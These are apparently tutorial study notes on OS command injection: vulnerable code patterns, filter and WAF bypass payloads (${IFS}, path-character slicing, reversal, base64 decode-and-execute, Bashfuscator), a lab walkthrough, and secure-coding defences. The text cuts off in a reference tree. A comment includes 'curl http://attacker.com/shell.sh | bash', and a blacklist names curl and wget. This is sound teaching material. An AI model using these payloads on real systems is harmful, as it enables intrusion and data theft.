🏠 [Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership) [☕ Discord](https://discord.com/invite/A446Bx4z)

**50% Discount For Members**
> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](shop.motasem-notes.net)


Complete Web Hacking Study Notes From [here](https://buymeacoffee.com/notescatalog/e/280732)

## 1. What Is Command Injection?
Command injection is one of the most critical vulnerability classes in web application security — ranked in the **OWASP Top 10** (#3 under Injection). It allows an attacker to execute arbitrary OS-level commands directly on the back-end server by injecting into input that is passed to a system command function.

The root cause is always the same: **user-controlled input flows into a system command without sufficient sanitisation.** The attacker doesn't need to break out of the application — they're already inside it from the server's perspective.

### Common Injection Types (Context)

|Type|Description|Example Entry Point|
|---|---|---|
|**OS Command Injection**|User input becomes part of an OS command|Ping utilities, file converters, DNS lookups|
|**Code Injection**|User input is passed into an `eval()`-style function|Template engines, scripting endpoints|
|**SQL Injection**|User input is part of a database query|Login forms, search fields|
|**XSS/HTML Injection**|User input is reflected into the page|Comment boxes, profile fields|
|**LDAP Injection**|User input is part of an LDAP query|Directory-integrated login|
|**NoSQL Injection**|User input manipulates a NoSQL query|MongoDB filter parameters|

---

### Why Command Injection Exists — Vulnerable Code Patterns

The vulnerability arises whenever a developer passes user input to a system execution function. Here are the most common patterns across languages:

**PHP:**

```php
// Vulnerable PHP — direct user input into shell command
$filename = $_GET['filename'];
system("touch /var/uploads/" . $filename);

// Other dangerous PHP functions to watch for:
// exec(), system(), shell_exec(), passthru(), popen(), proc_open()

// Example: file manager that lets the user name a new file
// Attacker input: "file.txt; curl http://attacker.com/shell.sh | bash"
// Resulting command: touch /var/uploads/file.txt; curl http://attacker.com/shell.sh | bash
```

**Node.js:**

```javascript
// Vulnerable Node.js — child_process with user input
const { exec } = require('child_process');
const filename = req.query.filename;
exec(`touch /var/uploads/${filename}`, (err, stdout, stderr) => {
    res.send(stdout);
});

// Other dangerous Node.js functions:
// child_process.exec(), child_process.execSync(),
// child_process.spawn() with shell:true, child_process.spawnSync()

// Note: spawn() is safer by default since it doesn't use a shell,
// but becomes dangerous when shell:true is passed.
```

**Python:**

```python
# Vulnerable Python
import os
import subprocess

filename = request.args.get('filename')
os.system(f"touch /var/uploads/{filename}")          # Dangerous
subprocess.call(f"ping -c 1 {filename}", shell=True) # Dangerous with shell=True

# Safe alternatives:
subprocess.call(["ping", "-c", "1", filename])       # Safe — args as list, no shell
```

> **Key insight:** The vulnerability is in _how_ the function is called, not which function is used. `subprocess.call()` is safe when arguments are passed as a list; dangerous when `shell=True` is combined with string concatenation.

---

## 2. Injection Operators

These operators let us chain or replace commands. Understanding them — and which platforms support which — is the foundation of injection exploitation.

### Full Operator Reference

|Operator|URL Encoded|Behaviour|Linux|Windows|
|---|---|---|---|---|
|`;`|`%3b`|Execute both commands regardless of exit code|✅|❌ (CMD only; works in PS)|
|`\n`|`%0a`|Newline — execute both commands|✅|✅|
|`&`|`%26`|Run both commands; second output often shown first|✅|✅|
|`\|`|`%7c`|Pipe first into second; **only second output shown**|✅|✅|
|`&&`|`%26%26`|Execute second **only if first succeeds** (exit 0)|✅|✅|
|`\|`|`%7c%7c`|Execute second **only if first fails** (exit ≠ 0)|✅|✅|
|`` ` ` ``|`%60%60`|Sub-shell execution (backticks)|✅|❌|
|`$()`|`%24%28%29`|Sub-shell execution (preferred over backticks)|✅|❌|
|`^`|`%5e`|Escape character (ignored by CMD)|❌|✅ (CMD)|

### Operator Behaviour — Decision Guide

```bash
# Use ; when you want both to run, don't care about order
127.0.0.1; whoami

# Use | when you only want to see your injected command's output (cleaner)
127.0.0.1 | whoami

# Use && when the original command must succeed first
# (safer in auth contexts — you know the app is reaching the command)
127.0.0.1 && whoami

# Use || when you want to BREAK the first command intentionally
# Useful when you can't make both run cleanly — just omit the IP
|| whoami
# The ping fails → OR kicks in → whoami runs

# Use $() or backticks to nest command output as an argument
echo $(whoami)
ping -c 1 $(cat /etc/hostname)
```

---

## 3. Detecting Injection Points

Detection uses the same methodology as exploitation — we try to append commands and observe behaviour. The key is methodical testing: **isolate one variable at a time.**

### Step 1: Identify Where Input Goes

When you see a web app field that might interact with the OS, mentally model what the underlying command could be:

```
Field: "IP Address to ping"
Likely command: ping -c 1 <your_input>

Field: "Filename to move"
Likely command: mv <source> <your_input_destination>

Field: "Domain to look up"
Likely command: nslookup <your_input> OR dig <your_input>

Field: "File to convert"
Likely command: convert <input_file> <format> <output>
```

### Step 2: Test With a Harmless Canary

Before trying noisy operators, test with something that proves execution without causing damage:

```bash
# Option 1: time-based (no output needed — just measure response time)
127.0.0.1; sleep 5
127.0.0.1 && sleep 5

# Option 2: DNS callback (if you have a collaborator/interactsh instance)
127.0.0.1; nslookup <your-collaborator-domain>
127.0.0.1; curl http://<your-server>/proof

# Option 3: whoami (quick, low-impact, shows execution context)
127.0.0.1; whoami
```

### Step 3: Differentiate Error Types

When a payload fails, the _type_ of error tells you where the blocking is happening:

```
Error: JavaScript tooltip / form validation message, no request sent
→ Frontend-only validation. Bypass via Burp/Repeater.

Error: "Invalid input" page from the app itself, request WAS sent
→ Backend filter/blacklist in the application code.

Error: Full WAF block page with your IP, request ID, or generic message
→ Web Application Firewall. Requires more advanced evasion.
```

---

## 4. Bypassing Front-End Validation

Front-end validation (JavaScript `onsubmit` handlers, `pattern` attributes, `maxlength`) is **not a security control** — it's a UX feature. It can always be bypassed by sending requests directly without using the browser's form.

### Method 1: Burp Suite Proxy (Preferred)

```
Workflow:
1. Submit a clean, valid request through the form (e.g., a real IP address)
2. In Burp, catch the request → Send to Repeater (Ctrl+R)
3. In Repeater, modify the parameter to include your payload
4. URL-encode special characters: Ctrl+U in Burp encodes the selection
5. Send and examine the response
```

### Method 2: curl — Send Directly

```bash
# Skip the browser entirely — craft the exact HTTP request yourself
curl -s "http://target.com/api/ping" \
  -X POST \
  -d "ip=127.0.0.1%3bwhoami" \
  -H "Content-Type: application/x-www-form-urlencoded"

# With a session cookie (for authenticated endpoints)
curl -s "http://target.com/api/ping" \
  -X POST \
  -d "ip=127.0.0.1%0awhoami" \
  -H "Cookie: session=abc123def456"
```

### Method 3: Browser DevTools

```javascript
// In the browser console, modify the form action or disable validation:
// Option A: Remove the validation attribute
document.getElementById('ip-input').removeAttribute('pattern');
document.getElementById('ip-input').removeAttribute('maxlength');

// Option B: Submit the form programmatically with your payload
document.getElementById('ip-input').value = '127.0.0.1; whoami';
document.getElementById('ping-form').submit();
```

> **Rule of thumb:** If the error appears without the browser making a network request (check DevTools → Network tab), it's client-side only and trivially bypassed.

---

## 5. Identifying & Bypassing Filters

Once the request is reaching the backend, we need to methodically identify exactly what is being filtered before attempting bypasses.

### Understanding Backend Blacklist Logic

A typical PHP blacklist implementation:

```php
<?php
// Example backend filter
$blacklist = ['&', '|', ';', '`', '$', '(', ')', '{', '}', ' '];

foreach ($blacklist as $char) {
    if (strpos($_POST['ip'], $char) !== false) {
        echo "Invalid input detected.";
        exit;
    }
}

// Execute if passed
system("ping -c 1 " . $_POST['ip']);
?>
```

The problem with this approach: blacklists are always incomplete. This one misses `\n`, `%0a`, redirection operators (`<`, `>`), and many encoded variants.

### Methodology: Binary Search for Filtered Characters

Test one character at a time to pinpoint exactly what's blocked — don't guess:

```bash
# Test each operator in isolation via Burp Repeater
# Payload 1: test the semicolon
ip=127.0.0.1;

# Payload 2: test the newline
ip=127.0.0.1%0a

# Payload 3: test the pipe
ip=127.0.0.1|

# Payload 4: test the ampersand
ip=127.0.0.1%26

# Continue until you find which one passes
```

Once you find an operator that passes, test whether a space after it passes:

```bash
# Does newline + space work?
ip=127.0.0.1%0a whoami

# Does newline + tab work?
ip=127.0.0.1%0a%09whoami
```

Then test whether the command itself is filtered:

```bash
# Is whoami blocked?
ip=127.0.0.1%0awhoami

# Is id blocked?
ip=127.0.0.1%0aid

# Is a completely harmless word blocked?
ip=127.0.0.1%0aecho
```

This process gives you a precise map of what the filter blocks, so you can construct a bypass that avoids every blocked element.

---

## 6. Bypassing Space Filters

Spaces are one of the most commonly blacklisted characters because they're required between command arguments — filtering them seems like it should prevent execution. It doesn't.

### Tab Character (`%09`)

Linux and Windows both accept tabs between command arguments:

```bash
# Replace every space with %09 (horizontal tab)
127.0.0.1%0a%09whoami
127.0.0.1%0a%09ls%09-la
```

### `$IFS` Environment Variable (Linux)

`$IFS` (Internal Field Separator) defaults to space + tab + newline. When bash encounters `${IFS}`, it substitutes a space, allowing argument separation:

```bash
# Basic usage
127.0.0.1%0a${IFS}whoami

# With command arguments
127.0.0.1%0als${IFS}-la${IFS}/etc

# With a full path
127.0.0.1%0acat${IFS}/etc/passwd
```

### Brace Expansion (Linux — Bash)

Bash's brace expansion can bundle a command and its arguments without spaces:

```bash
# Syntax: {command,arg1,arg2}
{ls,-la}
{cat,/etc/passwd}
{whoami}

# In a full payload
127.0.0.1%0a{ls,-la}
127.0.0.1%0a{cat,/etc/passwd}

# With a path that uses a slash bypass (combined technique)
127.0.0.1%0a{ls,${PATH:0:1}home}
```

### Input Redirection Operator (`<<<`)

The here-string operator can be used as a space alternative in some contexts:

```bash
# Instead of: cat /etc/passwd
# Use: cat<<<'/etc/passwd' — no space needed
cat<<<'/etc/passwd'

# Useful for base64 decoding (avoiding pipe | and space)
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
```

### Summary: Space Bypass Techniques

|Technique|Payload Example|Platform|
|---|---|---|
|Tab `%09`|`ls%09-la`|Linux + Windows|
|`${IFS}`|`ls${IFS}-la`|Linux|
|`$IFS` (no braces)|`ls$IFS-la`|Linux|
|Brace expansion|`{ls,-la}`|Linux (Bash)|
|`<<<` here-string|`cat<<<'/etc/passwd'`|Linux|
|`%20` (sometimes)|`ls%20-la`|Depends on filter|

---

## 7. Bypassing Blacklisted Characters

Beyond spaces, the most commonly blacklisted characters are `/` (path separator on Linux/Mac) and `\` (path separator on Windows). Without these, path traversal and file access seem impossible — but environment variables solve this elegantly.

### Linux: Extracting Characters from Environment Variables

The key insight: we can use bash string slicing (`${variable:start:length}`) to extract any character we need from an existing environment variable.

```bash
# View environment variables that contain useful characters
printenv

# $PATH typically starts with /usr/local/bin:/usr/bin:/bin...
# Extract the first character: /
echo ${PATH:0:1}        # Outputs: /

# $HOME is typically /home/username
# Also starts with /
echo ${HOME:0:1}        # Outputs: /

# Finding the colon (:) — it appears in $PATH between directories
echo ${PATH:9:1}        # Position varies — check with: echo $PATH first

# Example: getting the colon from PATH
# If $PATH = /usr/local/bin:/usr/bin:/bin
# Position 14 would be ':'
echo ${PATH:14:1}       # May output: :
```

**Practical path construction:**

```bash
# Construct /etc/passwd without typing a single /
# ${PATH:0:1} = /
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Full injection payload to read /etc/passwd:
127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# List the /home directory:
127.0.0.1%0a{ls,${PATH:0:1}home}

# Read a file in a user's home directory:
127.0.0.1%0acat${IFS}${PATH:0:1}home${PATH:0:1}username${PATH:0:1}flag.txt
```

**Semi-colon from environment variables (if `;` is filtered):**

```bash
# Semi-colon appears in $LS_COLORS on some systems
# Check with: echo $LS_COLORS | grep -o ';' | head -1
# Or check character position:
echo $LS_COLORS | cut -c20      # Adjust position based on your target

# More reliable: use a different operator instead of ;
# Newline %0a is usually a better choice
```

### Windows: Extracting Characters from Environment Variables

**CMD:**

```batch
REM %HOMEPATH% is typically \Users\username
REM Extract the first character: \
echo %HOMEPATH:~0,1%        # Outputs: \

REM For a forward slash — less native to Windows, but
REM %PROGRAMFILES(X86)% contains forward slash in some versions
```

**PowerShell:**

```powershell
# $env:HOMEPATH is \Users\username — extract \
$env:HOMEPATH[0]                    # Outputs: \

# $env:PROGRAMFILES is C:\Program Files
$env:PROGRAMFILES[2]               # Outputs: \

# List all environment variables to find useful characters
Get-ChildItem Env:
Get-ChildItem Env: | Select-Object Name, Value | Format-List
```

### Linux: Character Shifting

An alternative technique — shift an ASCII character by 1 using `tr` to produce the character you need:

```bash
# The technique: tr shifts a range of characters up by one
# We provide the character one below what we want
echo $(tr '!-}' '"-~'<<<[)    # [ is ASCII 91, \ is ASCII 92

# For forward slash (ASCII 47):
# The character before / in ASCII is . (ASCII 46)
echo $(tr '!-}' '"-~'<<<.)    # Outputs: /

# Verify ASCII values:
man ascii
# Or: printf '%d\n' "'/"     # Outputs decimal ASCII of /
```

---

## 8. Bypassing Blacklisted Commands

When specific commands like `whoami`, `ls`, `cat`, `id` are blocked by name, we can obfuscate them so they don't match the blacklist string but still execute correctly.

### Understanding Why Obfuscation Works

A basic command blacklist does exact string matching:

```php
<?php
$blacklisted_commands = ['whoami', 'ls', 'cat', 'id', 'uname', 'wget', 'curl'];

foreach ($blacklisted_commands as $cmd) {
    if (strpos($_POST['ip'], $cmd) !== false) {
        die("Blocked");
    }
}
?>
```

This only catches exact matches. Any modification to the string that doesn't affect shell parsing will bypass it.

### Technique 1: Quote Insertion (Linux + Windows)

Shells ignore empty quotes within commands. Inserting `''` (single) or `""` (double) quotes at any position within a command name causes no functional difference:

```bash
# Single quotes — works on Linux and Windows
w'h'o'am'i           # executes as: whoami
wh''oami             # executes as: whoami
l's'                 # executes as: ls
c'a't /etc/passwd    # executes as: cat /etc/passwd
i'd'                 # executes as: id

# Double quotes — same behaviour
w"h"o"am"i           # executes as: whoami
"wh"oami             # executes as: whoami

# Rules:
# ✅ Number of quotes must be EVEN (every opened quote must be closed)
# ✅ Single and double quotes cannot be mixed in the same word
# ❌ w'h"oami — mixing types, will break
```

### Technique 2: Backslash Insertion (Linux Only)

Bash ignores backslashes that don't form valid escape sequences within commands:

```bash
# Backslash between characters — bash ignores them
w\hoami              # executes as: whoami
wh\oam\i             # executes as: whoami
\l\s                 # executes as: ls
c\at /etc/passwd     # executes as: cat /etc/passwd
```

### Technique 3: `$@` Variable Insertion (Linux Only)

`$@` expands to nothing by default (it holds the script's positional parameters, which are empty in this context):

```bash
who$@ami             # executes as: whoami
l$@s                 # executes as: ls
i$@d                 # executes as: id
```

### Technique 4: Caret `^` Insertion (Windows CMD Only)

CMD treats `^` as an escape character that is consumed by the shell before command execution:

```batch
who^ami              :: executes as: whoami
wh^oa^mi             :: executes as: whoami
i^d                  :: executes as: id
```

### Character Bypass Summary

|Technique|Example|Linux|Windows|
|---|---|---|---|
|Single quotes `''`|`w'ho'ami`|✅|✅|
|Double quotes `""`|`w"ho"ami`|✅|✅|
|Backslash `\`|`w\hoami`|✅|❌|
|`$@` variable|`wh$@oami`|✅|❌|
|Caret `^`|`wh^oami`|❌|✅ (CMD)|

---

## 9. Advanced Command Obfuscation

When basic character insertion isn't enough — particularly against WAFs with more sophisticated pattern matching — these techniques modify the command at a deeper level.

### Case Manipulation

**Windows (CMD and PowerShell are case-insensitive):**

```powershell
# Any case variation works natively in Windows
WHOAMI
WhOaMi
wHoAmI
wHOami

# PowerShell is equally case-insensitive
GET-CHILDITEM
get-childitem
Get-ChildItem
```

**Linux (case-sensitive, so we need to convert at runtime):**

```bash
# Technique 1: tr command to lowercase at runtime
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(tr "[A-Z]" "[a-z]"<<<"LS")
$(tr "[A-Z]" "[a-z]"<<<"CAT${IFS}/ETC/PASSWD")

# Technique 2: printf lowercase expansion
$(a="WhOaMi";printf %s "${a,,}")
$(a="LS${IFS}-LA";printf %s "${a,,}")

# Important: these techniques introduce spaces — combine with space bypass
# For example, using ${IFS} inside the outer command
127.0.0.1%0a$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"WhOaMi")
```

### Reversed Commands

Reverse the command string, then use a sub-shell to reverse and execute it at runtime:

**Linux:**

```bash
# Step 1: reverse the command string
echo 'whoami' | rev
# Output: imaohw

echo 'ls -la' | rev
# Output: al- sl

echo 'cat /etc/passwd' | rev
# Output: dwssap/cte/ tac

# Step 2: use the reversed string in a payload
$(rev<<<'imaohw')           # executes: whoami
$(rev<<<'al-${IFS}sl')     # executes: ls -la
$(rev<<<'dwssap/cte/${IFS}tac')  # executes: cat /etc/passwd

# Full injection payload
127.0.0.1%0a$(rev<<<'imaohw')
```

**Windows (PowerShell):**

```powershell
# Step 1: reverse the string
"whoami"[-1..-20] -join ''
# Output: imaohw

# Step 2: execute via iex (Invoke-Expression)
iex "$('imaohw'[-1..-20] -join '')"
iex "$('teg-metI-dlihc'[-1..-20] -join '')"   # Get-ChildItem
```

### Base64 Encoding

The most powerful and versatile obfuscation method. Allows you to encode an entire complex command (including normally-filtered characters like spaces, pipes, slashes) into a single, clean base64 string, then decode and execute at runtime.

**Linux — Full Workflow:**

```bash
# Step 1: Encode your payload (on your attack machine)
echo -n 'cat /etc/passwd | grep root' | base64
# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCByb290

echo -n 'ls -la /home' | base64
# Output: bHMgLWxhIC9ob21l

echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
# Output: ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

# Step 2: Build the payload for injection
# bash<<< avoids using a pipe, base64 -d decodes
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCByb290)

# Alternative using echo and pipe (if pipe isn't filtered)
echo${IFS}Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCByb290|base64${IFS}-d|bash

# Using /dev/stdin for environments where <<< isn't available
base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCByb290|bash

# If base64 command is blacklisted, use openssl instead:
openssl${IFS}enc${IFS}-d${IFS}-base64<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCByb290|bash

# Or use xxd for hex encoding instead of base64:
echo -n 'whoami' | xxd -p
# Output: 77686f616d69
echo${IFS}77686f616d69|xxd${IFS}-r${IFS}-p|bash
```

**Windows — Full Workflow:**

```powershell
# Windows uses UTF-16LE encoding for PowerShell's -EncodedCommand flag

# Step 1: Encode on a Linux machine (convert to UTF-16LE first)
echo -n 'whoami' | iconv -f utf-8 -t utf-16le | base64
# Output: dwBoAG8AYQBtAGkA

echo -n 'Get-ChildItem C:\Users' | iconv -f utf-8 -t utf-16le | base64

# Step 2: Encode on a Windows machine
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Output: dwBoAG8AYQBtAGkA

# Step 3: Execute in PowerShell
powershell -EncodedCommand dwBoAG8AYQBtAGkA

# Or via iex in an existing PowerShell session:
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### Putting It All Together — Combined Bypass Example

Real-world scenario: WAF blocks spaces, slashes, `whoami`, `cat`, `ls`, and common operators. Here's how we chain bypasses:

```bash
# Target: read /home/username/flag.txt

# Step 1: encode the full command
echo -n 'cat /home/username/flag.txt' | base64
# Output: Y2F0IC9ob21lL3VzZXJuYW1lL2ZsYWcudHh0

# Step 2: use %0a (newline) as operator, ${IFS} for spaces, base64 decode
127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ob21lL3VzZXJuYW1lL2ZsYWcudHh0)

# Why this works even with most filters:
# - No ; or | or & operator (uses \n %0a)
# - No spaces (uses ${IFS})
# - No / characters (inside the base64 blob)
# - No 'cat', 'ls', 'whoami' in plaintext (all encoded)
# - No $() sub-shell (uses <<<)
```

---

## 10. Evasion Tools

When manual obfuscation isn't bypassing a particularly sophisticated filter or WAF, automated obfuscation tools can generate payloads using techniques unlikely to match known signatures.

### Linux: Bashfuscator

[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) generates obfuscated bash payloads through multiple layered techniques.

**Installation:**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

**Usage:**

```bash
# Basic usage — random technique, unpredictable output length
./bashfuscator -c 'cat /etc/passwd'

# Fine-tuned — control verbosity to get a shorter, more predictable output
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# -s 1        = low "size" (shorter output)
# -t 1        = minimal "time" complexity
# --no-mangling  = skip variable name randomisation (shorter)
# --layers 1  = one layer of obfuscation (keeps it shorter)

# Test the output before using it
bash -c '<paste the bashfuscator output here>'

# Example workflow: obfuscate a full command
./bashfuscator -c 'cat /home/user/flag.txt' -s 1 -t 1 --no-mangling --layers 1
# Then test:
bash -c 'output_from_tool'
```

### Windows: Invoke-DOSfuscation

[Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) is an interactive PowerShell tool that obfuscates CMD and PowerShell commands.

**Installation:**

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

**Usage:**

```powershell
# Inside the DOSfuscation interactive shell:
tutorial                  # Walk through an example
help                      # See all commands

# Obfuscate a type/cat equivalent
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1                         # Select encoding type

# Test from a Linux host with pwsh (cross-platform PowerShell)
pwsh
# Then paste and run the generated obfuscated command
```

---

## 11. Prevention & Secure Coding

### 1. Avoid System Command Functions

The most effective defence is never using OS command execution functions with user input. Every language has safer built-in alternatives:

```php
<?php
// VULNERABLE: Executing a system command to check host availability
$host = $_GET['host'];
system("ping -c 1 " . $host);

// SECURE: Use PHP's built-in socket function instead
$host = $_GET['host'];
$fp = @fsockopen($host, 80, $errno, $errstr, 5);
if ($fp) {
    echo "Host is reachable";
    fclose($fp);
} else {
    echo "Host unreachable: $errstr ($errno)";
}
?>
```

```python
# VULNERABLE: subprocess with shell=True and user input
import subprocess
hostname = request.args.get('host')
result = subprocess.call(f"ping -c 1 {hostname}", shell=True)

# SECURE: subprocess with argument list (no shell) + allowlist validation
import subprocess
import ipaddress

def validate_ip(ip_string):
    try:
        ipaddress.ip_address(ip_string)
        return True
    except ValueError:
        return False

hostname = request.args.get('host', '')
if not validate_ip(hostname):
    return "Invalid IP", 400

# Arguments as list — shell=False is the default, making this safe
result = subprocess.run(["ping", "-c", "1", hostname],
                        capture_output=True, text=True, timeout=5)
```

### 2. Input Validation — Allowlist, Not Blacklist

Validate against a strict allowlist of what is acceptable, not a blacklist of what isn't:

```php
<?php
// WRONG: Blacklist — always incomplete
$blacklist = [';', '|', '&', '`', '$'];
foreach ($blacklist as $char) {
    if (strpos($_POST['ip'], $char) !== false) die("Invalid");
}

// CORRECT: Allowlist — only permit what you expect
$ip = $_POST['ip'];

// For IP addresses — use PHP's built-in filter
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address format");
}

// For alphanumeric fields — regex allowlist
$username = $_POST['username'];
if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    die("Invalid username format");
}

// For email addresses
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email format");
}
?>
```

```javascript
// JavaScript (Node.js) — input validation with regex allowlist
const net = require('net');

function validateIP(ip) {
    // Use Node's built-in network validation
    return net.isIP(ip) !== 0;  // Returns 4 or 6 for valid IPs, 0 for invalid
}

function validateUsername(username) {
    const pattern = /^[a-zA-Z0-9_]{3,20}$/;
    return pattern.test(username);
}

// In your route handler:
app.post('/ping', (req, res) => {
    const ip = req.body.ip;
    if (!validateIP(ip)) {
        return res.status(400).json({error: 'Invalid IP address'});
    }
    // Safe to proceed — ip is a validated IP string
});
```

### 3. Input Sanitisation

Sanitisation removes or escapes dangerous characters from input that has passed validation — a second layer of defence:

```php
<?php
// PHP — remove non-alphanumeric characters
$input = preg_replace('/[^a-zA-Z0-9\.\-\_]/', '', $_POST['hostname']);

// PHP — escape shell arguments (safer than blacklisting, but not foolproof)
// escapeshellarg() wraps the string in single quotes and escapes any
// existing single quotes — prevents the argument from escaping the shell context
$safe_arg = escapeshellarg($_POST['host']);
system("ping -c 1 " . $safe_arg);  // Better, but avoid OS commands entirely

// PHP — escape shell metacharacters
$safe = escapeshellcmd($_POST['host']);  // Less safe than escapeshellarg
?>
```

```javascript
// Node.js — DOMPurify for HTML context (prevents XSS alongside injection)
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const purify = DOMPurify(window);

const clean = purify.sanitize(userInput);

// Node.js — basic sanitisation for shell arguments
// The 'shell-quote' library properly handles shell argument escaping
const quote = require('shell-quote').quote;
const safeArgs = quote([userInput]);  // Properly escapes for shell use
```

### 4. Server Configuration (Defence in Depth)

Even with good code, server-level configuration reduces the blast radius if injection occurs:

```apache
# Apache — enable ModSecurity WAF
LoadModule security2_module modules/mod_security2.so

# Reject double-encoded URLs (common injection evasion technique)
SecRule REQUEST_URI "!@validEncoding" "id:1,phase:1,t:none,deny"

# Reject non-ASCII characters in URIs
SecRule REQUEST_URI "[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\xff]" "id:2,phase:1,deny"
```

```ini
; PHP — php.ini hardening
; Disable dangerous functions that execute OS commands
disable_functions = system, exec, shell_exec, passthru, popen, proc_open, pcntl_exec

; Restrict file access to the web root — prevents reading /etc/passwd etc.
open_basedir = /var/www/html:/tmp

; Don't expose PHP version in headers
expose_php = Off
```

```nginx
# Nginx — restrict executable permissions and locations
location ~* \.(php|pl|py|sh)$ {
    # Only serve PHP from specific directories — not /tmp, /uploads etc.
    deny all;
}
```

**Principle of least privilege — OS level:**

```bash
# Run web server as a dedicated low-privilege user (not root, not www-data with excess permissions)
useradd -r -s /sbin/nologin -d /var/www webapp-user

# Set strict file ownership
chown -R root:webapp-user /var/www/html
chmod -R 750 /var/www/html

# Directories that must be writable by the app get minimal write access
chmod 770 /var/www/html/uploads
chown webapp-user:webapp-user /var/www/html/uploads

# Verify what the web process can access
sudo -u webapp-user ls /etc/shadow  # Should be denied
sudo -u webapp-user cat /etc/passwd # This will work — acceptable (world-readable)
```

---

## 12. Skills Assessment Walkthrough

_This section documents a realistic end-to-end exploitation of a file manager web application with backend command injection protections._

### Reconnaissance

The target is a file manager web application. File managers are high-value targets for command injection because they almost universally use OS commands internally — `mv`, `cp`, `ls`, `mkdir`, `rm` are all candidates.

The first step is to map every user-controlled input and identify which generates a backend OS interaction:

```
Search bars → typically filtered through safe APIs
File name input → potentially goes into rename/touch commands
Move/Copy destination → HIGH probability of mv/cp with user-controlled path
Permissions change → chmod with user-controlled values
```

### Isolating the Injection Point

After identifying the file move function as the likely target, submit a normal request and capture it in Burp. A typical move request might look like:

```http
POST /api/move HTTP/1.1
Host: filemanager.target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

from=%2Fvar%2Fwww%2Fhtml%2Ftest.txt&to=%2Ftmp%2F
```

The `to` parameter is the injection point — it's being passed to something like `mv /var/www/html/test.txt /tmp/`.

### Filter Identification

Test each injection operator in isolation against the `to` parameter:

```
to=/tmp/;           → "Invalid input" (semicolon blocked)
to=/tmp/%0a         → HTTP 200, move succeeds (newline passes!)
to=/tmp/%0a whoami  → HTTP 200, but no output visible (space issue? word blocked?)
to=/tmp/%0awhoami   → "Invalid input" (whoami blocked)
to=/tmp/%26         → HTTP 200 (&& operator permitted)
```

So we know: `\n` works as an operator, spaces may be blocked, `whoami` is in the blacklist.

### Building the Working Payload

Step 1 — Bypass the command blacklist using reversal:

```bash
# Reverse whoami on attack machine:
echo 'whoami' | rev
# Output: imaohw
```

Step 2 — Construct payload with reversed command in a sub-shell:

```
to=/tmp/%26$(rev<<<'imaohw')
```

If `$()` is blocked, fall back to here-string or try URL-encoding the operator differently.

Step 3 — Verify execution by observing the response output.

### Escalating to File Read

Encode a more complex command to avoid all filters at once:

```bash
# On attack machine — encode the desired command
echo -n 'ls -la /home' | base64
# Output: bHMgLWxhIC9ob21l

echo -n 'cat /home/user/flag.txt' | base64
# Output: Y2F0IC9ob21lL3VzZXIvZmxhZy50eHQ=
```

Payload in Burp Repeater:

```
to=/tmp/%26bash<<<$(base64${IFS}-d<<<bHMgLWxhIC9ob21l)
```

The response body (or a visible file output) reveals the directory listing, helping you enumerate the path to the flag.

Once the path is confirmed, encode and execute the read command:

```
to=/tmp/%26bash<<<$(base64${IFS}-d<<<Y2F0IC9ob21lL3VzZXIvZmxhZy50eHQ=)
```

---

## 13. Quick Reference Tables

### Bypass Cheat Sheet by Filter Type

|What's Filtered|Bypass Technique|Payload Example|
|---|---|---|
|`;`|Use `%0a` newline instead|`127.0.0.1%0awhoami`|
|`\|` pipe|Use `<<<` here-string|`bash<<<$(base64 -d<<<...)`|
|Space|Tab `%09`|`ls%09-la`|
|Space|`${IFS}`|`ls${IFS}-la`|
|Space|Brace expansion|`{ls,-la}`|
|`/` slash|`${PATH:0:1}`|`cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd`|
|`whoami`|Quotes|`w'h'oami` or `w"h"oami`|
|`whoami`|Backslash|`w\hoami`|
|`whoami`|`$@`|`wh$@oami`|
|`whoami`|Reversal|`$(rev<<<'imaohw')`|
|`whoami`|Case + `tr`|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|
|Everything|Base64 encode|`bash<<<$(base64${IFS}-d<<<<encoded>)`|

### Operator Decision Tree

```
Do I need to see output from MY command?
├── YES
│   ├── Use | (only my output shown)
│   ├── Use || with broken first command (only my output shown)
│   └── Use ; or \n (both shown — look for mine in the response)
└── NO (time-based / out-of-band)
